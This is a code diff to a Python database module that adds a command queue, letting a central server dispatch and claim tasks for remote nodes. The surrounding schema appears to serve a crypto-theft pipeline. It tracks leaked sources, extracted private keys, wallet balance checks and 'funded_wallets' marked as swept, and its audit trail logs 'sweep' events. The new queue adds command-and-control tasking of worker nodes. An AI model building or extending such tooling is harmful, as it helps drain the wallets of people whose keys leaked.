@@ -108,11 +108,22 @@ async def init_db():
                 last_heartbeat TIMESTAMP DEFAULT NOW()
             );
 
+            CREATE TABLE IF NOT EXISTS command_queue (
+                id SERIAL PRIMARY KEY,
+                node_id TEXT NOT NULL,
+                command TEXT NOT NULL,
+                payload JSONB DEFAULT '{}',
+                created_at TIMESTAMP DEFAULT NOW(),
+                claimed BOOLEAN DEFAULT FALSE,
+                claimed_at TIMESTAMP
+            );
+
             CREATE INDEX IF NOT EXISTS idx_seen_keys_source ON seen_keys(source);
             CREATE INDEX IF NOT EXISTS idx_raw_leaks_source ON raw_leaks(source);
             CREATE INDEX IF NOT EXISTS idx_extracted_keys_hash ON extracted_keys(key_hash);
             CREATE INDEX IF NOT EXISTS idx_balance_checks_address ON balance_checks(address);
             CREATE INDEX IF NOT EXISTS idx_funded_wallets_swept ON funded_wallets(swept);
+            CREATE INDEX IF NOT EXISTS idx_command_queue_node ON command_queue(node_id, claimed);
         """)
     logger.info("Database initialized")
 
@@ -345,5 +356,34 @@ async def get_audit_trail(limit: int = 100) -> list[dict]:
                SELECT 'sweep' as event_type, chain as source, address as url, NULL as node_id, found_at FROM funded_wallets
                ORDER BY found_at DESC LIMIT $1""",
             limit,
+        )
+        return [dict(r) for r in rows]
+
+
+# ── Command queue operations ────────────────────────────────────────────────
+
+async def enqueue_command(node_id: str, command: str, payload: dict | None = None):
+    """Add a command to the queue for a node."""
+    pool = await get_pool()
+    async with pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO command_queue (node_id, command, payload) VALUES ($1, $2, $3)",
+            node_id, command, json.dumps(payload or {}),
+        )
+
+
+async def claim_commands(node_id: str, limit: int = 10) -> list[dict]:
+    """Claim pending commands for a node. Marks them as claimed."""
+    pool = await get_pool()
+    async with pool.acquire() as conn:
+        rows = await conn.fetch(
+            """UPDATE command_queue SET claimed = TRUE, claimed_at = NOW()
+               WHERE id IN (
+                 SELECT id FROM command_queue
+                 WHERE node_id = $1 AND claimed = FALSE
+                 ORDER BY created_at ASC LIMIT $2
+               )
+               RETURNING id, command, payload, created_at""",
+            node_id, limit,
         )
         return [dict(r) for r in rows]
